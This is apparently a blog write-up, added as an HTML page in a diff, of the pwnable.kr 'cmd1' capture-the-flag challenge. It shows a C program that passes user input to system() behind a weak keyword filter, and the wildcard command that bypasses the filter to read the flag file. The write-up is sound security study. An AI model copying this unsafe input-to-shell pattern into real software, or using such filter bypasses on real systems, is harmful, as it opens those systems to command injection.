@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../css/style.css">
+  </head>
+
+<h1 id="cmd1">cmd1</h1>
+<p>5th Arpil 2022</p>
+<pre><code class="lang-c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span>
+
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">filter</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* cmd)</span></span>{
+        <span class="hljs-keyword">int</span> r=<span class="hljs-number">0</span>;
+        r += <span class="hljs-built_in">strstr</span>(cmd, <span class="hljs-string">"flag"</span>)!=<span class="hljs-number">0</span>;
+        r += <span class="hljs-built_in">strstr</span>(cmd, <span class="hljs-string">"sh"</span>)!=<span class="hljs-number">0</span>;
+        r += <span class="hljs-built_in">strstr</span>(cmd, <span class="hljs-string">"tmp"</span>)!=<span class="hljs-number">0</span>;
+        <span class="hljs-keyword">return</span> r;
+}
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[], <span class="hljs-keyword">char</span>** envp)</span></span>{
+        putenv(<span class="hljs-string">"PATH=/thankyouverymuch"</span>);
+        <span class="hljs-keyword">if</span>(filter(argv[<span class="hljs-number">1</span>])) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+        system( argv[<span class="hljs-number">1</span>] );
+        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</code></pre>
+<p><code>putenv(&quot;PATH=/thankyouverymuch&quot;);</code> replaces the entire $PATH environment variable, meaning if we want to execute system commands we now need to specify the full path e.g. <code>cat</code> vs <code>/bin/cat</code>.</p>
+<p>The filter function checks if the command you submit contains <code>flag</code>, <code>sh</code>, or <code>tmp</code>.<br>We can&#39;t <code>/bin/cat flag</code>.<br>We can&#39;t spawn a shell <code>/bin/bash</code>. <code>tmux</code> is available but no permissions to read <code>flag</code>.<br>We can&#39;t copy a bash shell to /tmp or drop a binary to /tmp.  </p>
+<p>You have to bypass the filter.</p>
+<p>Only the full word <code>flag</code> is filtered, so we can use a wildcard <code>*</code> to read the flag file.</p>
+<pre><code>cmd1<span class="hljs-variable">@pwnable</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>which cat
+/bin/cat
+cmd1<span class="hljs-variable">@pwnable</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>./cmd1 <span class="hljs-string">"/bin/cat fl*"</span>
+mommy now I get what PATH environment is <span class="hljs-keyword">for</span> <span class="hljs-symbol">:</span>)
+</code></pre>
